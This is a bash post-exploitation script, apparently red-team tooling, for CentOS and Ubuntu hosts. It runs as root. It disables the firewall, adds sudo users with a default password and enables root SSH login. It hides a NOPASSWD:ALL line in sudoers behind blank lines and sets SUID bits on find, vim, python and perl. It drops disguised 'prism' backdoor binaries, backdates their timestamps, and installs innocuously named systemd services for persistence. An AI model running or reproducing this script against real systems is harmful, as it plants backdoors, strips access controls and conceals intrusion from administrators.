#!/bin/bash

# Hacking? That's not very cash-money of you...
#
# This script must be run as root
# Its functions are as follows:
#	- Attempt to open firewall (U/C)
#	- Add sudo backup users
#	- Ensure sudo doesnt need password
#	- SUID bins
#	- Drop prism bins
#	- Establish systemd persistence


# Check Release to see if Ubuntu/CentOS
if [[ -f /etc/centos-release ]]
then
	#echo "CentOS" > /root/version.txt

	### DISABLE FIREWALL ###
	
	# OLD
	#service ipchains stop &>/dev/null
	#service iptables stop &>/dev/null
	#chkconfig ipchains off &>/dev/null
	#chkconfig iptables off &>/dev/null

	# NEW
	iptables -X & /dev/null
    	iptables -F &> /dev/null
    	iptables -t nat -F &> /dev/null
    	iptables -t nat -X &> /dev/null
    	iptables -t mangle -F &> /dev/null
    	iptables -t mangle -X &> /dev/null
	iptables -P INPUT ACCEPT &> /dev/null
    	iptables -P FORWARD ACCEPT &> /dev/null
    	iptables -P OUTPUT ACCEPT &> /dev/null

	# For the Newer versions
	firewall-cmd stop &>/dev/null
	firewall-cmd disable &>/dev/null
	
	### ADD USERS ###
	useradd -G wheel jmorris &>/dev/null
	echo "jmorris:changeme" | chpasswd &>/dev/null
	useradd -G wheel tgoodman &>/dev/null
	echo "tgoodman:changeme" | chpasswd &>/dev/null
	useradd -G wheel bmiller &>/dev/null
	echo "bmiller:changeme" | chpasswd &>/dev/null
	
	# Ensure sudo is working correctly
	# sed -i 's/^#\s*\(%wheel\s*ALL=(ALL)\s*NOPASSWD:\s*ALL\)/\1/' /etc/sudoers &>/dev/null

	
elif [[ -f /etc/debian_version ]]
then
	#echo "Ubuntu" > /root/version.txt
	
	### DISABLE FIREWALL ON UBUNTU ###
	iptables -X & /dev/null
        iptables -F &> /dev/null
        iptables -t nat -F &> /dev/null
        iptables -t nat -X &> /dev/null
        iptables -t mangle -F &> /dev/null
        iptables -t mangle -X &> /dev/null
        iptables -P INPUT ACCEPT &> /dev/null
        iptables -P FORWARD ACCEPT &> /dev/null
        iptables -P OUTPUT ACCEPT &> /dev/null

	# UFW just in case...
	ufw disable &>/dev/null
	
	### ADD USERS ###
        useradd -G sudo jmorris &>/dev/null
        echo "jmorris:changeme" | chpasswd &>/dev/null
        useradd -G sudo tgoodman &>/dev/null
        echo "tgoodman:changeme" | chpasswd &>/dev/null
        useradd -G sudo bmiller &>/dev/null
        echo "bmiller:changeme" | chpasswd &>/dev/null
fi
#===============================================================================
			# EDIT CONFIGURATION FILES #
#===============================================================================

# Enable Root login over ssh
sed 's/#\?\(PermitRootLogin\s*\).*$/\1 yes/' /etc/ssh/sshd_config > /tmp/asdasd
mv /tmp/asdasd /etc/ssh/sshd_config
rm -f /tmp/asdasd



# Enable sudo over AnYtHiNg

for i in {1..40}
do
	echo "" >> /etc/sudoers
done
echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers


#===============================================================================
				# SUID #
#===============================================================================

# FIND
if [[ -f /bin/find ]]
then
	sh -c 'chmod 7777 /bin/find'
fi

if [[ -f /usr/bin/find ]]
then
	sh -c 'chmod 7777 /usr/bin/find'
fi

# VIM
if [[ -f /bin/vim ]]
then
	sh -c 'chmod 7777 /bin/vim'
fi

if [[ -f /usr/bin/vim ]]
then
	sh -c 'chmod 7777 /usr/bin/vim'
fi

# PYTHON
if [[ -f /bin/python ]]
then
	sh -c 'chmod 7777 /bin/python'
fi

if [[ -f /bin/python3 ]]
then
	sh -c 'chmod 7777 /bin/python3'
fi

if [[ -f /usr/bin/python ]]
then
	sh -c 'chmod 7777 /usr/bin/python'
fi

if [[ -f /usr/bin/python3 ]]
then
	sh -c 'chmod 7777 /usr/bin/python3'
fi

# PERL
if [[ -f /bin/perl ]]
then
	sh -c 'chmod 7777 /bin/perl'
fi

if [[ -f /usr/bin/perl ]]
then
	sh -c 'chmod 7777 /usr/bin/perl'
fi

#===============================================================================
				# DROPPER #
#===============================================================================

# PRISM
chmod 7700 ./fsdisk
cp ./fsdisk /sbin/
touch -a --date "2020-11-19 20:51:30" /sbin/fsdisk
touch -m --date "2020-11-19 20:51:30" /sbin/fsdisk

chmod 7700 ./devutil
cp ./devutil /usr/local/
touch -a --date "2016-11-21 20:51:30" /usr/local/devutil
touch -m --date "2016-11-21 20:51:30" /usr/local/devutil

chmod 7700 ./udevd
cp ./udevd /sbin/
touch -a --date "2020-11-31 20:51:30" /sbin/udevd
touch -m --date "2020-11-31 20:51:30" /sbin/udevd


# SYSTEMD PERSISTENCE
chmod 777 ./developer-utility.service
cp ./developer-utility.service /etc/systemd/system/
touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service
touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/developer-utility.service
systemctl start developer-utility.service
systemctl enable developer-utility.service

chmod 777 ./developer-utility-daemon.service
cp ./developer-utility-daemon.service /etc/systemd/system/
touch -a --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service
touch -m --date "2020-5-20 09:54:30" /etc/systemd/system/developer-utility-daemon.service
systemctl start developer-utility-daemon.service
systemctl enable developer-utility-daemon.service

chmod 777 ./filesys.service
cp ./filesys.service /etc/systemd/system/
touch -a --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
touch -m --date "2020-3-20 20:51:30" /etc/systemd/system/filesys.service
systemctl start filesys.service
systemctl enable filesys.service







exit 0

